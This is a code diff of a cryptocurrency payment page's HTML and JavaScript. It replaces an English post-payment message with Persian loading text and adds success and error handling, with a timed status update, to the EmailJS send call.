@@ -156,10 +156,7 @@ p{
     <!-- Step 4 -->
     <div class="section" id="status">
       <div class="loader"></div>
-      <p>
-        If the payment is completed successfully,<br>
-        your USDT contract will be reviewed and sent to your email.
-      </p>
+      <p>در حال ارسال...</p>
     </div>
   </div>
 </div>
@@ -172,14 +169,25 @@ function showEmail(){
 }
 function sendEmail(){
   const email = document.getElementById("emailInput").value;
+  
+  // نمایش آیکن چرخشی
+  document.getElementById("status").style.display = "block";
+  document.getElementById("status").innerHTML = '<div class="loader"></div><p>در حال ارسال...</p>';
+
   emailjs.send(
     "service_j8bd9vn",
     "template_paduqpn",
     {
       email: email
     }
-  );
-  document.getElementById("status").style.display="block";
+  ).then(function(response) {
+    // بعد از ۴ ثانیه تغییرات
+    setTimeout(function() {
+      document.getElementById("status").innerHTML = '<span style="color:green;">✔</span><p>ایمیل را بررسی کنید</p>';
+    }, 4000);  // ۴ ثانیه صبر می‌کند
+  }, function(error) {
+    document.getElementById("status").innerHTML = '<span style="color:red;">❌</span><p>مشکلی در ارسال ایمیل پیش آمد</p>';
+  });
 }
 function copyAddress(){
   const address = document.getElementById("walletAddress").innerText;
